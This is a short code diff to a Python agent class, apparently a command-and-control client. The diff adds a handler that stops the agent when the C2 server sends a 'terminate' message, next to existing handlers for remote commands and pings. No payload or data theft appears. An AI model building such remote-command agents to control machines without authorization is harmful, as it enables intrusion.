@@ -329,7 +329,12 @@ class NOPAgent:
                 data = json.loads(message)
                 msg_type = data.get("type")
                 
-                if msg_type == "command":
+                if msg_type == "terminate":
+                    print(f"[{{datetime.now()}}] Terminate command received from C2")
+                    print(f"[{{datetime.now()}}] Message: {{data.get('message', 'Shutting down...')}}")
+                    self.running = False
+                    break
+                elif msg_type == "command":
                     await self.handle_command(data)
                 elif msg_type == "ping":
                     await self.send_pong()
